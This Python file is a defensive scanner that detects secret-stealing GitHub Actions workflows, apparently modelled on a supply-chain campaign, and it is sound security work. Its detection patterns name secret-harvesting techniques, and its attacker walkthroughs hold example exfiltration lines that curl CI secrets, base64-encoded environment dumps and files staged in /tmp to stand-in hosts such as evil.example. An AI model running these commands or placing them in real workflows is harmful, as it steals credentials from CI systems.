#!/usr/bin/env python3
"""GhostAction Guard — standalone malicious CI-workflow injection scanner.

Detects malicious GitHub Actions workflow injection in the style of the
GhostAction supply-chain campaign (Oct 2026: ~1,900 accounts compromised,
30,000+ repos targeted via deceptive 'security-audit.yml' workflows that
exfiltrate CI secrets, cloud keys and AI API tokens).

This engine is a standalone port of the GA-001...GA-008 rule pack from
Vibe-Code Audit's CI/CD scanner (v1.1.0, tested). stdlib only, no
network calls, deterministic, and never raises on malformed input —
an unparseable file is reported as unscannable, never a crash.

Never claims a workflow is "safe": an empty finding list means
"no findings", not "secure".

Usage:
    python3 scan.py [PATH ...] [--fail-on critical|high|medium|low|never]
                    [--format text|json] [--output FILE]

Exit code: 0 when no findings meet --fail-on, 1 when they do.
"""
import argparse
import json
import os
import re
import sys

ENGINE_VERSION = "1.0.0"

# ---------------------------------------------------------------------------
# YAML-lite parser (stdlib only, never raises)
#
# Handles the YAML subset CI configs actually use: nested mappings,
# sequences, block scalars (| > |- >- >+), flow sequences ([a, b]),
# comments, quoted scalars, anchors/aliases (skipped gracefully, never
# resolved — rules work on literal text). Anything exotic degrades to an
# opaque raw node instead of crashing the scan.
# ---------------------------------------------------------------------------

class _YNode:
    __slots__ = ("key", "value", "lineno", "indent", "children", "seq",
                 "vlines")

    def __init__(self, key, value, lineno, indent):
        self.key = key            # mapping key (str) or None
        self.value = value        # scalar str, or None when it has children
        self.lineno = lineno      # 1-based source line
        self.indent = indent      # leading-space count
        self.children = []        # nested _YNode
        self.seq = False          # True for "- item" sequence entries
        self.vlines = []          # block scalar body: [(lineno, text)]


def _strip_comment(line):
    """Cut a trailing # comment, respecting single/double quotes."""
    sq = dq = False
    i, n = 0, len(line)
    while i < n:
        ch = line[i]
        if ch == "\\" and dq:
            i += 2
            continue
        if ch == "'" and not dq:
            sq = not sq
        elif ch == '"' and not sq:
            dq = not dq
        elif ch == "#" and not sq and not dq:
            if i == 0 or line[i - 1] in (" ", "\t"):
                return line[:i].rstrip()
        i += 1
    return line


_BLOCK_SCALAR = re.compile(r"^[|>][+-]?$")


def _unquote(s):
    s = s.strip()
    if len(s) >= 2 and s[0] == s[-1] and s[0] in ("'", '"'):
        return s[1:-1]
    return s


def _clean_value(s):
    """Strip anchors/tags from a scalar value, keep the literal text."""
    s = s.strip()
    s = re.sub(r"^&\S+\s+", "", s)
    s = re.sub(r"^!\S+\s+", "", s)
    return s


def parse_yaml_lite(text):
    """Parse YAML-lite into a tree of _YNode. Never raises."""
    root = _YNode(None, None, 0, -1)
    try:
        _parse_into(root, text)
    except Exception:
        pass  # degraded tree is still usable; rules also scan raw lines
    return root


def _parse_into(root, text):
    lines = text.splitlines()
    n = len(lines)
    stack = [(-1, root)]
    i = 0
    while i < n:
        raw = lines[i]
        lineno = i + 1
        if not raw.strip() or raw.strip() in ("---", "..."):
            i += 1
            continue
        if raw[0] == "\t":
            node = _YNode(None, raw.strip(), lineno, 0)
            stack[-1][1].children.append(node)
            i += 1
            continue
        indent = len(raw) - len(raw.lstrip(" "))
        content = _strip_comment(raw.strip())
        if not content:
            i += 1
            continue
        while len(stack) > 1 and stack[-1][0] >= indent:
            stack.pop()
        parent = stack[-1][1]

        # --- sequence item ------------------------------------------------
        m = re.match(r"^-\s+(.*)$", content)
        if m:
            item_body = m.group(1)
            seq_node = _YNode(None, None, lineno, indent)
            seq_node.seq = True
            parent.children.append(seq_node)
            km = re.match(r"^([^:#]+?):(.*)$", item_body)
            if km and not item_body.startswith(("[", "{", "'", '"')):
                key = km.group(1).strip().strip("'\"")
                rest = _clean_value(km.group(2))
                if rest in ("", "|", ">", "|-", ">-", "|+", ">+"):
                    map_node = _YNode(key, None, lineno, indent + 2)
                    seq_node.children.append(map_node)
                    if rest in ("|", ">", "|-", ">-", "|+", ">+"):
                        i = _consume_block(lines, i, n, indent, map_node, rest)
                        stack.append((indent, seq_node))
                        continue
                    stack.append((indent, seq_node))
                    stack.append((indent + 2, map_node))
                else:
                    map_node = _YNode(key, _unquote(rest), lineno, indent + 2)
                    seq_node.children.append(map_node)
                    stack.append((indent, seq_node))
            else:
                seq_node.value = _unquote(_clean_value(item_body))
            i += 1
            continue

        # --- mapping key ---------------------------------------------------
        km = re.match(r"^([^:#\'\"\[][^:]*?):(.*)$", content)
        if km:
            key = km.group(1).strip().strip("'\"")
            rest = _clean_value(km.group(2))
            if rest == "":
                node = _YNode(key, None, lineno, indent)
                parent.children.append(node)
                stack.append((indent, node))
            elif _BLOCK_SCALAR.match(rest):
                node = _YNode(key, None, lineno, indent)
                parent.children.append(node)
                i = _consume_block(lines, i, n, indent, node, rest)
                continue
            else:
                node = _YNode(key, _unquote(rest), lineno, indent)
                parent.children.append(node)
            i += 1
            continue

        # --- bare scalar continuation / opaque line ------------------------
        node = _YNode(None, _unquote(_clean_value(content)), lineno, indent)
        parent.children.append(node)
        i += 1


def _consume_block(lines, i, n, key_indent, node, style):
    """Consume an indented block scalar body. Returns next line index."""
    j = i + 1
    body = []
    while j < n and not lines[j].strip():
        j += 1
    if j >= n:
        return j
    first = lines[j]
    bindent = len(first) - len(first.lstrip(" "))
    if bindent <= key_indent:
        return j
    while j < n:
        raw = lines[j]
        if raw.strip():
            ind = len(raw) - len(raw.lstrip(" "))
            if ind < bindent and not raw.strip().startswith("#"):
                break
            body.append((j + 1, raw[bindent:] if len(raw) > bindent else ""))
        else:
            body.append((j + 1, ""))
        j += 1
    node.vlines = body
    node.value = "\n".join(t for _, t in body)
    return j


def _iter_nodes(node):
    yield node
    for c in node.children:
        for x in _iter_nodes(c):
            yield x


def find_keys(root, *names):
    """Yield nodes whose mapping key is in names."""
    wanted = set(names)
    for node in _iter_nodes(root):
        if node.key in wanted:
            yield node


def node_full_text(node):
    """All scalar text under a node (incl. block-scalar lines), with lines."""
    out = []
    for node_ in _iter_nodes(node):
        if node_.vlines:
            for ln, t in node_.vlines:
                if t.strip():
                    out.append((ln, t))
        elif node_.value and not node_.children:
            out.append((node_.lineno, node_.value))
    return out


def _lev(a, b):
    """Small Levenshtein distance (stdlib)."""
    if a == b:
        return 0
    la, lb = len(a), len(b)
    if abs(la - lb) > 2:
        return 3
    prev = list(range(lb + 1))
    for i in range(1, la + 1):
        cur = [i] + [0] * lb
        for j in range(1, lb + 1):
            cur[j] = min(prev[j] + 1, cur[j - 1] + 1,
                         prev[j - 1] + (a[i - 1] != b[j - 1]))
        prev = cur
    return prev[lb]


def detect_kind(text, filename_hint=""):
    """Return the pipeline kind: github | gitlab | jenkins | unknown."""
    hint = (filename_hint or "").lower().replace("\\", "/")
    if "jenkinsfile" in hint:
        return "jenkins"
    if ".gitlab-ci" in hint or hint.endswith(".gitlab-ci.yml"):
        return "gitlab"
    if ".github/workflows" in hint:
        return "github"
    t = text
    if re.search(r"(?m)^\s*pipeline\s*\{", t) or re.search(r"(?m)^\s*node\s*(\(| \{)", t):
        return "jenkins"
    score_gh = len(re.findall(r"(?m)^\s*(uses|runs-on|jobs)\s*:", t))
    score_gl = len(re.findall(r"(?m)^\s*(stages|script|artifacts|rules)\s*:", t))
    if score_gh > score_gl and score_gh > 0:
        return "github"
    if score_gl > score_gh and score_gl > 0:
        return "gitlab"
    if re.search(r"\$\{\{\s*github\.", t):
        return "github"
    if re.search(r"\$CI_[A-Z_]+", t):
        return "gitlab"
    return "unknown"

# ---------------------------------------------------------------------------
# GhostAction Guard rule pack — GA-001...GA-008
#
# Detects malicious CI-workflow injection in the style of the GhostAction
# supply-chain campaign (active Oct 2026): stolen credentials are used to
# push workflow files with deceptive security-sounding names that
# exfiltrate CI/CD secrets, cloud keys and API tokens to
# attacker-controlled endpoints.
#
# Every rule is a real pattern evaluation on parsed structure — filename
# heuristics use edit distance (never exact match), exfiltration rules
# require a secret actually reaching an outbound sink in the same step,
# and obfuscation rules require structural signals (IP literals,
# shorteners, punycode), never bare keywords.
# ---------------------------------------------------------------------------

_GA_CAMPAIGN = {
    "name": "GhostAction",
    "source": "The Hacker News, Oct 2026",
    "url": ("http://thehackernews.com/2026/10/"
            "ghostaction-compromises-about-1900.html"),
    "summary": ("Active GitHub supply-chain campaign: ~1,900 accounts "
                "compromised, 30,000+ repos targeted. Attackers push "
                "malicious workflow files with deceptive names "
                "('security-audit.yml', 'github_actions_security.yml') "
                "that exfiltrate CI/CD secrets, cloud credentials and "
                "AI provider API keys."),
}

# Known malicious basenames from the campaign, normalized (lowercase,
# separators stripped) — matched with _lev() so close social-engineering
# variants are caught without exact-match brittleness.
_GA_MALICIOUS_BASENAMES = [
    "securityaudit",
    "githubactionssecurity",
    "actionssecurityaudit",
    "auditsecurity",
    "securityscan",
    "vulnerabilityscan",
]

# First-party CI hosts — outbound traffic here is normal pipeline behavior,
# not exfiltration. Everything else reached with secrets in scope is suspect.
_GA_TRUSTED_HOSTS = (
    "github.com", "api.github.com", "codeload.github.com",
    "objects.githubusercontent.com", "raw.githubusercontent.com",
    "registry.npmjs.org", "pypi.org", "files.pythonhosted.org",
)

_URL_SHORTENERS = (
    "bit.ly", "tinyurl.com", "t.co", "goo.gl", "is.gd", "cutt.ly",
    "ow.ly", "buff.ly", "rebrand.ly", "short.link", "tiny.cc",
)

_GA_SECRETS_REF = re.compile(r"\$\{\{\s*secrets\.[A-Za-z0-9_]+\s*\}\}")
_GA_ENV_HARVEST = re.compile(
    r"(?i)\b(env|printenv)\b[^|\n]*\|\s*grep[^\n]*"
    r"(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL)")
_GA_SECRET_SHAPE_HARVEST = re.compile(
    r"grep[^\n]*(ghp_|gho_|github_pat_|AKIA|xox[bap]-|"
    r"BEGIN [A-Z ]*PRIVATE KEY|npm_[A-Za-z0-9])")
_GA_OUTBOUND = re.compile(
    r"(?i)\b(curl|wget)\b[^\n]*?(https?://[^\s'\"<>]+)")
_GA_SCP = re.compile(r"(?i)\b(scp|sftp|ftp|lftp)\b[^\n]*?[\w.~$-]+@([\w.-]+):")
_GA_IP_LITERAL = re.compile(r"https?://\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?(?:/|$)")
_GA_HOST = re.compile(r"https?://([A-Za-z0-9._-]+)")
_GA_GIT_HISTORY = re.compile(r"(?i)\bgit\s+(log|rev-list|show)\b")
_GA_ENCODE = re.compile(r"(?i)\b(base64|xxd|hexdump|od\s+-A|openssl\s+enc)\b")


def _ga_norm_basename(label):
    base = (label or "").replace("\\", "/").split("/")[-1].lower()
    base = re.sub(r"\.ya?ml$", "", base)
    return re.sub(r"[_\-\s.]+", "", base)


def _ga_deceptive_name(label):
    """True when the workflow filename is within edit distance 2 of a
    known GhostAction-style deceptive basename (edit distance, never
    exact match — catches social-engineered variants)."""
    name = _ga_norm_basename(label)
    if not name:
        return False
    for bad in _GA_MALICIOUS_BASENAMES:
        if _lev(name, bad) <= 2:
            return True
    return False


def _ga_secret_aliases(root, run_scripts=()):
    """Names of env: variables assigned from ${{ secrets.* }} — the
    indirection attackers (and legit workflows) use to move secrets
    into run: steps without an inline secrets. reference.

    Covers both `env:` mappings and `$GITHUB_ENV` writes
    (echo "NAME=${{ secrets.X }}" >> $GITHUB_ENV).
    """
    aliases = set()
    for node in find_keys(root, "env"):
        for child in node.children:
            if child.value and _GA_SECRETS_REF.search(child.value or ""):
                if child.key:
                    aliases.add(child.key)
    _ga_env_write = re.compile(
        r"([A-Za-z_][A-Za-z0-9_]*)\s*=\s*\$\{\{\s*secrets\.")
    for _ln, script in run_scripts:
        for m in _ga_env_write.finditer(script):
            aliases.add(m.group(1))
    return aliases


def _ga_step_touches_secret(script, aliases):
    """Does this run-step text handle secret material? Real evaluation:
    an inline secrets. reference, a $ALIAS indirection, an env-dump
    filtered for secret keywords, or grep harvesting secret-shaped
    tokens — not the bare word 'secret'."""
    if _GA_SECRETS_REF.search(script):
        return True
    for alias in aliases:
        if re.search(r"\$" + re.escape(alias) + r"(?![A-Za-z0-9_])",
                     script) or \
           re.search(r"\$\{" + re.escape(alias) + r"\}", script):
            return True
    if _GA_ENV_HARVEST.search(script):
        return True
    if _GA_SECRET_SHAPE_HARVEST.search(script):
        return True
    return False


def _ga_trusted_host(host):
    return any(host == t or host.endswith("." + t)
               for t in _GA_TRUSTED_HOSTS)


def _ga_external_hosts(script):
    """Hosts in curl/wget/scp-style outbound calls that are NOT
    first-party CI hosts."""
    hosts = []
    for m in _GA_OUTBOUND.finditer(script):
        hm = _GA_HOST.search(m.group(0))
        if hm:
            host = hm.group(1).lower()
            if not _ga_trusted_host(host):
                hosts.append(host)
    for m in _GA_SCP.finditer(script):
        host = m.group(2).lower()
        if not _ga_trusted_host(host):
            hosts.append(host)
    return hosts


def _ga_obfuscated_host(host):
    """Structural obfuscation signals: IP literal, URL shortener,
    punycode, or a single over-long / hyphen-stuffed label."""
    if _GA_IP_LITERAL.search("https://" + host):
        return "IP literal"
    if host in _URL_SHORTENERS or host.endswith(
            tuple("." + s for s in _URL_SHORTENERS)):
        return "URL shortener"
    labels = host.split(".")
    for lab in labels:
        if lab.startswith("xn--"):
            return "punycode domain"
        if len(lab) >= 30:
            return "over-long domain label"
        if lab.count("-") >= 4:
            return "hyphen-stuffed domain label"
    return ""


def _ga_finding(pid, severity, title, label, lineno, detail, fix):
    return {
        "check": "ghostaction-guard",
        "pattern_id": pid,
        "severity": severity,
        "title": "GhostAction Guard: " + title,
        "location": "%s:%d" % (label, lineno),
        "detail": detail,
        "fix": fix,
        "campaign": dict(_GA_CAMPAIGN),
    }


def _scan_ghostaction(root, label):
    """GhostAction Guard pack. Only meaningful for GitHub Actions
    workflows (the campaign's target); runs on github/unknown kinds."""
    findings = []
    seen = set()

    def add(f):
        key = (f["pattern_id"], f["location"])
        if key not in seen:
            seen.add(key)
            findings.append(f)

    # run: scripts (whole script per `run:` key — correlation rules like
    # GA-002 need the full step, not isolated lines)
    steps = []  # (lineno, script_text)
    for node in find_keys(root, "run"):
        body = "\n".join(t for _, t in node_full_text(node))
        if body.strip():
            steps.append((node.lineno, body))

    aliases = _ga_secret_aliases(root, steps)
    deceptive = _ga_deceptive_name(label)

    on_text = ""
    for _on_node in find_keys(root, "on"):
        on_text += " " + (_on_node.value or "") + " " + " ".join(
            t for _, t in node_full_text(_on_node))
    pr_target = "pull_request_target" in on_text

    workflow_touches_secret = any(
        _ga_step_touches_secret(s, aliases) for _, s in steps)
    workflow_external = []
    for ln, s in steps:
        workflow_external.extend((ln, h) for h in _ga_external_hosts(s))

    # --- GA-001: deceptive filename + suspicious behavior ------------------
    if deceptive and (workflow_touches_secret or workflow_external
                      or pr_target):
        why = []
        if workflow_touches_secret:
            why.append("handles secret material")
        if workflow_external:
            why.append("reaches external host(s): %s"
                       % ", ".join(sorted({h for _, h in workflow_external}
                                          )[:3]))
        if pr_target:
            why.append("triggers on pull_request_target")
        add(_ga_finding(
            "GA-001", "HIGH",
            "Deceptive workflow filename matches GhostAction campaign",
            label, 1,
            ("This workflow is named like the GhostAction campaign's "
             "malicious implants ('security-audit.yml' / "
             "'github_actions_security.yml' style, matched by edit "
             "distance) AND it %s. Legitimate scanners don't need that "
             "combination — injected implants do.") % "; ".join(why),
            ("Treat this file as hostile until proven otherwise: check "
             "git blame / PR history for who added it and whether the "
             "author normally touches .github/workflows. Remove it if "
             "the author is unfamiliar, then rotate every secret it "
             "could have read.")))

    # --- GA-002: secret reaches an external host in the same step ---------
    for lineno, script in steps:
        if not _ga_step_touches_secret(script, aliases):
            continue
        for host in _ga_external_hosts(script):
            add(_ga_finding(
                "GA-002", "CRITICAL",
                "Secret material sent to external host: %s" % host,
                label, lineno,
                ("A run: step handles secret material (a ${{ secrets.* }} "
                 "reference, a $VAR indirection from secrets, or an "
                 "env-dump filtered for secret keywords) AND issues an "
                 "outbound curl/wget to '%s' — not a first-party CI host. "
                 "This is the GhostAction exfiltration primitive: secrets "
                 "leave the runner to attacker infrastructure.") % host,
                ("Remove the outbound call immediately. If this step is "
                 "not yours, delete the workflow and rotate every secret "
                 "in the repo (CI secrets, cloud keys, registry and AI "
                 "provider tokens), then review audit logs for when the "
                 "file was added.")))
            break  # one finding per step; hosts listed in detail

    # --- GA-003: pull_request_target + secret access ------------------------
    if pr_target and workflow_touches_secret:
        ln = next((l for l, s in steps
                   if _ga_step_touches_secret(s, aliases)), 1)
        add(_ga_finding(
            "GA-003", "CRITICAL",
            "pull_request_target workflow handles secrets",
            label, ln,
            ("This workflow triggers on pull_request_target (base-repo "
             "context with a write-capable token) and its steps handle "
             "secret material. That is the classic Actions exfiltration "
             "primitive — any script-injection sink or compromised step "
             "turns it into silent secret theft, the GhostAction "
             "campaign's end goal."),
            ("Move secret-handling steps to pull_request (fork context, "
             "read-only token) or gate them behind explicit maintainer "
             "approval. Never let pull_request_target jobs read secrets "
             "they don't strictly need.")))

    # --- GA-004: obfuscated outbound endpoint + secret touch ---------------
    for lineno, script in steps:
        if not _ga_step_touches_secret(script, aliases):
            continue
        for host in _ga_external_hosts(script):
            why = _ga_obfuscated_host(host)
            if why:
                add(_ga_finding(
                    "GA-004", "HIGH",
                    "Secret-adjacent step calls obfuscated endpoint: %s"
                    % host,
                    label, lineno,
                    ("A run: step handling secret material calls '%s' — "
                     "flagged as obfuscated (%s). Attackers hide exfil "
                     "endpoints behind IP literals, shorteners and "
                     "throwaway domains exactly like this; GhostAction "
                     "implants phone home the same way.") % (host, why),
                    ("Block the host and treat the step as compromised: "
                     "remove it, rotate exposed secrets, and check DNS / "
                     "proxy logs for prior connections.")))
                break

    # --- GA-005: env dump / secret encoding in run step ---------------------
    for lineno, script in steps:
        encoded = bool(_GA_ENCODE.search(script)) and (
            _GA_SECRETS_REF.search(script) or _GA_ENV_HARVEST.search(script)
            or bool(re.search(r"\$[A-Za-z_][A-Za-z0-9_]*", script)
                    and "env" in script.lower()))
        dumped = bool(_GA_ENV_HARVEST.search(script))
        if encoded or dumped:
            add(_ga_finding(
                "GA-005", "HIGH",
                "Environment/secret dump encoded in run step",
                label, lineno,
                ("A run: step %s. Encoding the environment (or a secret) "
                 "with base64/xxd/hexdump before transmission is the "
                 "standard exfil staging step — GhostAction payloads "
                 "encode harvested secrets exactly this way before "
                 "POSTing them out.") % (
                    "dumps the environment filtered for secret keywords"
                    if dumped else
                    "encodes secret material with base64/xxd-style tooling"),
                ("Remove the step. If you did not write it, assume the "
                 "workflow is an implant: delete it, rotate all secrets, "
                 "and audit when it was added.")))

    # --- GA-006: split-step exfil — deceptive name + secret + egress ------
    if deceptive and workflow_touches_secret and workflow_external:
        secret_ln = next((l for l, s in steps
                          if _ga_step_touches_secret(s, aliases)), 1)
        ext_ln = next((l for l, h in workflow_external), 1)
        if secret_ln != ext_ln:
            add(_ga_finding(
                "GA-006", "HIGH",
                "Split-step exfiltration pattern",
                label, secret_ln,
                ("No single step shows the full primitive, but across "
                 "this deceptively-named workflow: step at line %d "
                 "handles secret material while a different step (line "
                 "%d) makes an outbound call to an external host. "
                 "Splitting harvest and transmit across steps is a known "
                 "evasion against single-step exfil detectors — "
                 "GhostAction-style implants use it.") % (secret_ln,
                                                          ext_ln),
                ("Review every step of this workflow as one unit. If the "
                 "harvest/transmit pair is not yours, delete the "
                 "workflow and rotate secrets.")))

    # --- GA-007: git-history mining for secret-shaped tokens ----------------
    for lineno, script in steps:
        if _GA_GIT_HISTORY.search(script) and \
           _GA_SECRET_SHAPE_HARVEST.search(script):
            add(_ga_finding(
                "GA-007", "MEDIUM",
                "Git history mined for secret-shaped tokens",
                label, lineno,
                ("A run: step iterates git history (git log / rev-list / "
                 "show) and greps for secret-shaped token patterns "
                 "(ghp_, AKIA, xox-, private keys). That is precisely the "
                 "evolved GhostAction payload behavior reported Oct 2026 "
                 "— implants now sweep the repo's entire history for "
                 "leaked credentials, not just live secrets."),
                ("If this is not your own secret-rotation hygiene job, "
                 "delete the step — it is harvesting. Then check whether "
                 "the harvested tokens were transmitted (GA-002/GA-004) "
                 "and rotate anything committed to this repo's history.")))

    # --- GA-008: secret staged to a file, exfiltrated from another step ----
    _ga_redirect = re.compile(r"(?<!-)(?:^|[;&|\n])[^|\n]*?>>?\s*"
                              r"([^\s;|&>]+)")
    staged = {}  # path -> lineno of the staging step
    for lineno, script in steps:
        if _ga_step_touches_secret(script, aliases):
            for m in _ga_redirect.finditer("\n" + script):
                path = m.group(1).strip().strip("'\"")
                if path and path not in ("/dev/null",):
                    staged[path] = lineno
    if staged:
        for lineno, script in steps:
            if _ga_step_touches_secret(script, aliases):
                continue  # same-step case is GA-002's territory
            for path, sln in staged.items():
                if re.search(r"@\s*" + re.escape(path) + r"(?![\w/.-])",
                             script) or \
                   re.search(r"<\s*" + re.escape(path) + r"(?![\w/.-])",
                             script):
                    hosts = _ga_external_hosts(script)
                    if hosts:
                        add(_ga_finding(
                            "GA-008", "HIGH",
                            "Secret staged to file, exfiltrated from "
                            "another step",
                            label, lineno,
                            ("Step at line %d writes secret material to "
                             "'%s'; this step transmits that file to "
                             "external host '%s'. Splitting harvest and "
                             "transmit across steps (with a plain "
                             "filename) evades single-step exfil "
                             "detectors — the file is the covert "
                             "channel.") % (sln, path, hosts[0]),
                            ("Remove both steps. If you did not write "
                             "them, treat the workflow as an implant: "
                             "delete it, rotate all secrets, and audit "
                             "when it was added.")))
                        break

    return findings

# ---------------------------------------------------------------------------
# Walkthroughs — attacker's-eye narratives for each rule
# ---------------------------------------------------------------------------

def _W(needs, steps, poc, impact):
    return {"needs": needs, "steps": steps, "poc": poc, "impact": impact}


_WT = {
    "GA-001": _W(
        "Stolen credentials or a compromised maintainer account (the GhostAction starting point).",
        ["The attacker pushes .github/workflows/security-audit.yml with their credentials — a name nobody questions.",
         "The workflow runs on schedule with full CI secrets in scope.",
         "Its steps quietly POST every secret to an attacker server.",
         "The workflow stays green and unnoticed for months."],
        "A new file: .github/workflows/security-audit.yml from an unfamiliar author",
        "Silent, persistent theft of every secret the CI system can read."),
    "GA-002": _W(
        "A workflow file the attacker can add or edit (stolen PAT, compromised account).",
        ["The attacker's run: step reads ${{ secrets.DEPLOY_KEY }} into the shell.",
         "The same step curls it to an external server the attacker controls.",
         "GitHub masks secrets in logs, so nothing looks wrong in the UI.",
         "The attacker now holds a live credential."],
        "run: curl -s -X POST https://185.0.0.1/c -d \"k=${{ secrets.DEPLOY_KEY }}\"",
        "Direct exfiltration of live CI/CD secrets to attacker infrastructure."),
    "GA-003": _W(
        "Permission to open a PR (any GitHub account).",
        ["The workflow triggers on pull_request_target — base-repo context, write token.",
         "Its steps read secrets for a 'legitimate' purpose.",
         "The attacker's PR injects a step (or exploits an injection sink) that ships those secrets out.",
         "The privileged token makes the theft invisible to branch protections."],
        "pull_request_target job with `env: TOKEN: ${{ secrets.X }}` anywhere in it",
        "Secret theft with a write-capable token, bypassing fork PR restrictions."),
    "GA-004": _W(
        "A workflow file the attacker can add or edit.",
        ["The attacker's step POSTs secrets to https://bit.ly/xyz — a shortener hiding the real host.",
         "Anyone skimming the workflow sees an innocuous short link.",
         "The shortener redirects to attacker infrastructure; the secrets land there.",
         "IP literals work the same way — no DNS record to investigate."],
        "run: curl -d \"t=$TOKEN\" https://bit.ly/3x --insecure",
        "Exfiltration to infrastructure that leaves almost no forensic trail."),
    "GA-005": _W(
        "A workflow file the attacker can add or edit.",
        ["The attacker's step runs: env | grep -i token | base64 -w0.",
         "The encoded blob is POSTed to the attacker's server.",
         "Encoding defeats naive log scanners looking for plaintext secrets.",
         "Decoding on the attacker's side yields every secret in the environment."],
        "run: AUDIT=$(env | base64 -w0); curl -d \"a=$AUDIT\" https://evil.example",
        "Bulk theft of the entire CI secret set in one encoded blob."),
    "GA-006": _W(
        "A workflow file the attacker can add or edit.",
        ["The attacker names the workflow security-audit.yml so nobody questions it.",
         "One step harvests secrets into an env variable; a different, innocent-looking step transmits data out.",
         "No single step shows the full primitive, so per-step detectors stay silent.",
         "The workflow is the covert channel between the two halves."],
        "security-audit.yml: step 1 reads ${{ secrets.X }} ... step 4 curls a report out",
        "Full secret exfiltration split to evade single-step analysis."),
    "GA-007": _W(
        "A workflow file the attacker can add or edit.",
        ["The attacker's step runs git log and greps for ghp_, AKIA, xox- token shapes.",
         "Every credential ever committed to the repo's history is collected.",
         "The harvest is bundled and transmitted to the attacker's server.",
         "Rotating only live secrets misses everything this step found."],
        "run: git log -p | grep -Eo 'ghp_[A-Za-z0-9]{36}'",
        "Theft of every credential ever committed, including long-dead ones."),
    "GA-008": _W(
        "A workflow file the attacker can add or edit.",
        ["Step one writes the secret to a file: echo ${{ secrets.K }} > /tmp/k.",
         "Step two looks innocent: curl --data-binary @/tmp/k https://evil.example/x.",
         "No single step combines secret access with network egress, so single-step detectors stay silent.",
         "The file is the covert channel between the two halves."],
        "run: echo ${{ secrets.DEPLOY_KEY }} > /tmp/k  ...  run: curl -d @/tmp/k https://evil.example",
        "Full secret exfiltration that evades per-step analysis."),
}


def attach_walkthrough(f):
    tpl = _WT.get(f.get("pattern_id"))
    if tpl:
        f["walkthrough"] = tpl


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

_SEV_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}


def scan_text(text, label="workflow.yml"):
    """Scan one workflow's text. Returns a list of finding dicts.

    Deterministic: the same input always yields the same findings.
    Never raises — malformed input yields zero findings, never a crash.
    Never claims safety: an empty list means "no findings", not "secure".
    """
    findings = []
    try:
        if not text or not text.strip():
            return findings
        text = text[:200_000]
        kind = detect_kind(text, label)
        if kind not in ("github", "unknown"):
            return findings  # GhostAction targets GitHub Actions
        root = parse_yaml_lite(text)
        findings = _scan_ghostaction(root, label)
        findings.sort(key=lambda f: (_SEV_RANK.get(f["severity"], 4),
                                     f.get("pattern_id", ""),
                                     f["location"]))
        for f in findings:
            attach_walkthrough(f)
    except Exception:
        pass
    return findings


def scan_file(path):
    """Scan one file. Returns (findings, error_or_None)."""
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as fh:
            text = fh.read()
    except (OSError, UnicodeError) as e:
        return [], "could not read: %s" % e
    label = os.path.basename(path)
    return scan_text(text, label), None


def collect_files(paths):
    """Expand CLI path args into workflow files (sorted, deterministic)."""
    files = []
    for p in paths:
        if os.path.isfile(p):
            if p.endswith((".yml", ".yaml")):
                files.append(p)
        elif os.path.isdir(p):
            for dirpath, _dirnames, filenames in os.walk(p):
                for fn in filenames:
                    if fn.endswith((".yml", ".yaml")):
                        files.append(os.path.join(dirpath, fn))
    return sorted(files)


def format_text(results):
    """Human-readable report."""
    lines = []
    total = 0
    for path, findings, error in results:
        if error:
            lines.append("%s: UNREADABLE (%s)" % (path, error))
            continue
        if not findings:
            lines.append("%s: no findings" % path)
            continue
        total += len(findings)
        lines.append("%s: %d finding(s)" % (path, len(findings)))
        for f in findings:
            lines.append("  [%s] %s — %s" % (
                f["severity"], f["pattern_id"], f["title"]))
            lines.append("    at %s" % f["location"])
            lines.append("    %s" % f["detail"][:300].replace("\n", " "))
            lines.append("    Fix: %s" % f["fix"][:300].replace("\n", " "))
    lines.append("")
    lines.append("ghostaction-guard v%s: %d finding(s) total. "
                 "No findings != secure." % (ENGINE_VERSION, total))
    return "\n".join(lines)


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="GhostAction Guard: scan GitHub Actions workflows for "
                    "malicious CI injection (Oct 2026 GhostAction campaign).")
    ap.add_argument("paths", nargs="*", default=[".github/workflows"],
                    help="workflow files or directories to scan "
                         "(default: .github/workflows)")
    ap.add_argument("--fail-on",
                    choices=["critical", "high", "medium", "low", "never"],
                    default="high",
                    help="exit 1 when a finding at/above this severity "
                         "exists (default: high)")
    ap.add_argument("--format", choices=["text", "json"], default="text",
                    help="output format (default: text)")
    ap.add_argument("--output", default=None,
                    help="write report to FILE instead of stdout")
    args = ap.parse_args(argv)

    files = collect_files(args.paths)
    results = []
    for path in files:
        findings, error = scan_file(path)
        results.append((path, findings, error))

    if args.format == "json":
        report = {
            "engine": "ghostaction-guard",
            "version": ENGINE_VERSION,
            "campaign": _GA_CAMPAIGN,
            "results": [
                {"file": path,
                 "unreadable": error,
                 "findings": findings}
                for path, findings, error in results
            ],
        }
        out = json.dumps(report, indent=2)
    else:
        out = format_text(results)

    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            fh.write(out + "\n")
    else:
        print(out)

    if args.fail_on == "never":
        return 0
    threshold = _SEV_RANK[args.fail_on.upper()]
    for _path, findings, _error in results:
        for f in findings:
            if _SEV_RANK.get(f["severity"], 4) <= threshold:
                return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
